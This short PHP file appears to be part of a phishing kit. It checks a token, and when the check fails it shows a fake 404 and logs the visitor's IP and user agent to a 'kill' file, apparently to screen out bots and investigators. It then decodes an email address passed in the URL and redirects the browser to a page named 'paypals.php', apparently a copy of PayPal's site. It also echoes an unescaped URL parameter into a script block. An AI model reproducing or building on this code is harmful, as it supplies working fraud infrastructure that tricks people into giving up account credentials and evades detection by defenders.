<?php
    session_start();
    require_once '../Vendor/Modernized.php';
    require_once '../Vendor/Pullers.php';
    require_once '../Vendor/Laravel.php';

    $Modernizeds = new Modernized;
    $Pullers = new Pullers;

    if (!$Modernizeds->checkToken()) {
        echo $Pullers->throw404();
        $Modernizeds->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }
    $token = $_GET['token'];
    $ema = $_GET['ema'];
   $enem = base64_decode($ema);

?>
<script>
								
                                    setTimeout(function(){
                                        window.location = 'paypals.php?token=<?=$token?>';
                                    }, 1000);

								</script>
